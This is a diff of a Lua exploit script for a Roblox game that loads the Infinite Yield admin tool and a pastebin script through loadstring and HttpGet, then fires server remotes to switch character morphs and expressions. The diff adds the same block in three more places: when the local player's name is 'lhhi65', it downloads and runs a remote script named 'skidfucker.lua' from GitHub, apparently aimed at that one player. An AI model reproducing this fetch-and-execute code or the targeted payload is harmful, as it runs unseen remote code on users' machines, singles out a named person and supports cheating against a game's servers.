@@ -2,6 +2,7 @@ if game.Players.LocalPlayer.Name == "lhhi65" then
   loadstring(game:HttpGet("https://raw.githubusercontent.com/gayloo/testscripts/skidfucker.lua"))();
   return
 end
+
 loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))();
 loadstring(game:HttpGet("https://pastebin.com/raw/PqBt2KtX"))(); -- no buggy graphics
 
@@ -34,6 +35,10 @@ game.ReplicatedStorage.remotes.morphs:FireServer("cream")
 game.ReplicatedStorage.remotes.morphs:FireServer("sally")
 game.ReplicatedStorage.remotes.morphs:FireServer("shadow")
 game.ReplicatedStorage.remotes.morphs:FireServer("rouge")
+if game.Players.LocalPlayer.Name == "lhhi65" then
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/gayloo/testscripts/skidfucker.lua"))();
+  return
+end
   end
 end)
 
@@ -49,6 +54,11 @@ game.ReplicatedStorage.remotes.expressions:FireServer("sad")
 settings().Rendering.QualityLevel = 10
   end
 end)
+
+if game.Players.LocalPlayer.Name == "lhhi65" then
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/gayloo/testscripts/skidfucker.lua"))();
+  return
+end
 
 uis.InputBegan:Connect(function(input, b)
   if input.KeyCode == Enum.KeyCode.Eight then
@@ -79,6 +89,11 @@ game.ReplicatedStorage.remotes.expressions:FireServer("angry")
 settings().Rendering.QualityLevel = 10
   end
 end)
+
+if game.Players.LocalPlayer.Name == "lhhi65" then
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/gayloo/testscripts/skidfucker.lua"))();
+  return
+end
 
 uis.InputBegan:Connect(function(input, f)
   if input.KeyCode == Enum.KeyCode.Four then
